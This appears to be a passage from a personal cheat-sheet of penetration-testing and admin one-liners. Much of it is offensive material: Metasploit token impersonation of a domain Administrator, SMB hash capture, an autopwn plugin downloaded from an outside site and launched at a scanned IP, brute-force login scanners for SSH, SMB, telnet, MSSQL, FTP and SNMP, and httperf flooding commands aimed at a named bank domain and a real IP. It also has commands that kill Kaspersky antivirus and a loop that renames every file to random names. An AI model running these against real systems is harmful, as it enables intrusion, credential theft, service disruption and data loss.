 onlt works for Delegation Tokens  
-------------------

            list_tokens -u
            impersonate_token ORACLE-ENT\\Administrator
            
            

after hijack incognito
-------------------

            use auxiliary/server/capture/smb
            

ubuntu autopwn
-------------------

            apt-get install  ruby1.8-dev libpq-dev postgresql -y
            gem install postgres
            
            
            # download autopwn .
            cd /pentest/exploits/framework/plugins/
            wget http://rmccurdy.com/scripts/db_autopwn.rb
            cd ..
            
            
            
            sudo -u postgres psql
            \password postgres
            \q
            
            
            sudo -u postgres createdb   msf
            
            ./msfconsole
            
            db_driver 
            db_driver postgresql
            db_connect postgres:postgres@127.0.0.1/msf
            db_nmap 123.123.123.123 -v -v -v -v
            load db_autopwn
            db_autpown -p -t -e 
            
            

ssh logins
-------------------

            use auxiliary/scanner/ssh/ssh_login
            set RHOSTS 192.168.1.1-255
            set USER_FILE "C:/wordlist/password_small.txt"
            run
            
            
            
            back
            
            #smb 
            use auxiliary/scanner/smb/smb_login
            set RHOSTS 127.0.0.1
            set SMBUser Administrator
            set PASS_FILE "C:/wordlist/password_small.txt" 
            set VERBOSE false
            set THREADS 16
            run
            
            
            
            back
            
            # telnet
            use auxiliary/scanner/telnet/telnet_login 
            set RHOSTS 127.0.0.1
            set PASS_FILE "C:/wordlist/password_small.txt" 
            set THREADS 254
            run
            
            
            
            back
            
            
            # mssql
            use auxiliary/scanner/mssql/mssql_login
            set RHOSTS 127.0.0.1
            set PASS_FILE "C:/wordlist/password_small.txt" 
            set USERNAME sa
            run
            
            
            back
            
             
            
            #ftp
            use auxiliary/scanner/ftp/ftp_login
            set RHOSTS 127.0.0.1
            set PASS_FILE "C:/wordlist/password_small.txt" 
            run
            
            
            
            #snmp
            use auxiliary/scanner/snmp/snmp_login
            set RHOSTS 127.0.0.1
            set PASS_FILE "C:/wordlist/snmp_default_pass.txt" 
            run
            
            
            
            
            User Summary
            
            Checks if a VNC server is vulnerable to the RealVNC authentication bypass (CVE-2006-2369).
            Example Usage
            
            nmap -sV -sC <target>
            
            db_driver postgresql
            db_connect postgres:"msf3:"32a771f6"@127.0.0.1:7175/msf3
            
            http://www.microsoft.com/download/en/details.aspx?displaylang=en&id=7558 Microsoft Baseline Security Analyzer 2.2 (for IT Professionals)
            
            .a/gxfr.py rmccurdy.com  --dns-lookup -v -t 10
            
            
            http stress test 
            .- HTTPS Support
            - 1000 simultaneous connections (each one with a different user/password)
            - Ability to record 2 or more application forms in order to test very specific application flows..
            
            In order to answer your question, there.re some tools like:
            
            Tool 1- httperf
            
            More examples that I used before.
            
            httperf --hog --server HOST --num-conn 1000 --ra 100 --timeout 5
            httperf --hog --server 192.168.1.3 --num-conn 1000 --ra 100 --timeout 5
            httperf --hog --server=192.168.1.3 --wsess=10,5,2 --rate 1 --timeout 5
            httperf --hog --server=www --wsess=10,5,2 --rate=1 --timeout=5 --ssl
            httperf  --hog  --server=bankinghome.es/apl/donativos/index_ca.html  --wsess=10,5,2 --rate=1 --timeout=5 --ssl --ssl-ciphers=EXP-RC4-MD5:EXP-RC2-CBC-MD5  --ssl-no-reuse --http-version=1.0
            httperf  --hog  --server=17.148.71.129/index.html  --wsess=10,5,2 --rate=1 --timeout=5 --ssl --ssl-ciphers=EXP-RC4-MD5:EXP-RC2-CBC-MD5  --ssl-no-reuse --http-version=1.0
            httperf  --hog  --server=http://17.148.71.129/index.html  --wsess=10,5,2 --rate=1 --timeout=5 --ssl --ssl-ciphers=EXP-RC4-MD5:EXP-RC2-CBC-MD5  --ssl-no-reuse --http-version=1.0
            
            Tool 2- fakeconnect
            
            fakeconnect -s SOURCE -d HOST -p PORT
            
            Tool 3- Apache benchmarking tool (accept POST)
            
            ab -n 100 -c 4 -p test.jpg http://localhost/
            (http://httpd.apache.org/docs/2.0/programs/ab.html)
            
            Tool 4- Curl-loader (it rocks, very customizable)
            
            http://curl-loader.sourceforge.net/
            
            
            And running hundreds and thousands of clients..., please, do not forget:
            
            1- To increase limit of descriptors (sockets) by running e.g.
            
            #ulimit -n 10000;
            
            2- Optionally, to set reuse of sockets in time-wait state, etc.., by setting:
            
            #echo 1 > /proc/sys/net/ipv4/tcp_tw_recycle and/or
            #echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse;
            #echo 1 > /proc/sys/net/ipv4/tcp_moderate_rcvbuf
            #echo 108544 > /proc/sys/net/core/wmem_max 
            #echo 108544 > /proc/sys/net/core/rmem_max 
            #echo "4096 87380 4194304" > /proc/sys/net/ipv4/tcp_rmem
            #echo "4096 16384 4194304" > /proc/sys/net/ipv4/tcp_wmem
            
            Additional info:
            
            http://ltp.sourceforge.net/tooltable.php
            
            Hope that help you.
            
            
            
            ==========
            
            
            random file raname rename random file
            IFS=$'\n';for fname in `ls`; do mv "$fname" $RANDOM$RANDOM ;done
            
            
            grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' ips | sort | uniq
            
            
            catchme.exe  -K "c:\Program Files\Kaspersky\avp.exe"
            catchme.exe  -E "c:\Program Files\Kaspersky\avp.exe"
            catchme.exe  -O "c:\Program Files\Kaspersky\avp.exe"
            reboot
            still looking into it .. can't kill it from memory yet I can delete the file
             
            
            

file size search
-------------------

            FOR /R C:\ %i in (*) do @if %~zi gtr 10000000 echo %i %~zi
            

screen cron 
-------------------

            @reboot /usr/bin/screen -fa -d -m -S torrent /usr/bin/rtorrent
            
            

netstat with pid
-------------------

            for /f "tokens=1,2,3,7 delims=: " %a in ('netstat -nao ^| find ^"LISTENING^" ^| find /v ^"::^"') do @(for /f "tokens=1,*" %n in ('"wmic process where processId=%d get caption,executablepath | find ".""') do @echo Protocol=%a, IP=%b, Port=%c, PID=%d, Name=%n, Path=%o)
            
            
            # CSV file size,file
            for /r c:\ %i in (*) do @echo %~zi, %i
            

md5 check but in linux style
-------------------

            md5 * | awk '{print $4,$2}' | sed 's/ (/ \*/g' | sed 's/)//g'
            
            
            
            #################
            # see ./fu_ripp.txt for ripped fu the size was getting out of hand ..
            #################